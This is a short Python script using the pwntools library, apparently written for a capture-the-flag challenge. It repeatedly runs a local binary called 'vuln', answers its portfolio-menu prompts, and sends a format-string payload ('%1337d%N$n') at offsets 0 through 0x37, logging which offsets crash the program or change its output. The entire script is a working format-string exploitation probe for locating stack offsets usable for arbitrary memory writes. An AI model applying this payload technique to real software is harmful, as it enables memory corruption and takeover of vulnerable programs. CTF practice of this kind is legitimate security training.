from pwn import *

STONKS = str(1337)
for idx in range(0x38):
    with process(['./vuln']) as tube:
        tube.recvuntil(b'portfolio\n')
        tube.sendline(b'1')
        tube.recvuntil(b'token?\n')
        tube.sendline(f'%{STONKS}d%{idx}$n'.encode('utf-8'))
        rest = tube.recv()
        if b'Goodbye!' not in rest:
            log.success(f"{idx} ({idx:x}) crashed:")
        elif STONKS.encode('utf-8') in rest:
            log.success(f"{idx} ({idx:x}) affected output:")
        else:
            log.failure(f"{idx} ({idx:x}) didn't crash:")
        for line in rest.splitlines():
            log.info(f"  {line!r}")
